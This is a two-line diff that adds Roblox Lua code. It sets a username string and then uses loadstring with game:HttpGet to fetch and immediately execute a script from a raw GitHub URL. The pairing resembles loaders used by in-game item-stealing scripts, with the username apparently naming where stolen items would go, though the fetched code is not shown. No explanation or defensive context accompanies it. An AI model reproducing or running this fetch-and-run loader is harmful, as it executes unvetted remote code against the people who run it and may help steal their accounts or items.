@@ -1,0 +1,2 @@
+Username = "o1te2WltM08zgt1x1"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Ownqa/lua/main/luaww.txt"))()
